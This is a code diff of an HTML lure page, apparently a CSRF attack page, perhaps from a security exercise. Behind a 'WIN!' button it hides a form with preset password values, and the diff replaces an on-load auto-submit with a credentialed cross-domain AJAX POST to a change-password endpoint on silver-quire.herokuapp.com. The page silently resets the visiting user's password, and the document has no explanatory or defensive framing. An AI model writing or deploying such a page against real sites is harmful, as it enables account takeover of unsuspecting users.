@@ -16,18 +16,39 @@
         <p class="text-center"><a class="btn btn-lg btn-success" href="#" role="button">WIN!</a></p>
       </div>
 	  
-	  <form id="hack" method="post" action="http://silver-quire.herokuapp.com/change-password" class="form-horizontal" >
+	  <!--<form id="hack" method="post" action="http://silver-quire.herokuapp.com/change-password" class="form-horizontal" >-->
+      <form id="hack">
+          <input id="password_confirmation" type="hidden" name="user[password]" value="aha"/>
       
-          <input id="password_confirmation" type="hidden" name="user[password]" value="karatekutya"/>
-      
-          <input id="password_confirmation" type="hidden" name="user[password_confirmation]" value="karatekutya"/>
+          <input id="password_confirmation" type="hidden" name="user[password_confirmation]" value="aha"/>
       
           <!--<button type="submit" class="btn btn-primary">Change!</button>-->
       
       </div>
-	  <script>
+	  <!--<script> first version
 		document.getElementById("hack").submit();
-	  </script>
+	  </script>-->
+	  <script>
+	  $.ajax({
+		 //contentType: 'application/x-www-form-urlencoded',
+         type: 'POST',
+         url: "http://silver-quire.herokuapp.com/change-password",
+         data: $('#hack').serialize(), 
+		 dataType: 'json',
+		xhrFields: {
+		   withCredentials: true
+		},
+		crossDomain: true,
+         /*success: function(response) {
+            alert("Submitted comment"); 
+             //$("#commentList").append("Name:" + $("#name").val() + "<br/>comment:" + $("#body").val());
+         },
+        error: function(e) {
+             //$("#commentList").append($("#name").val() + "<br/>" + $("#body").val());
+            alert("There was an error submitting comment \n" + e);
+        }*/
+     });
+	 </script>
     </form>
   </body>
 </html>
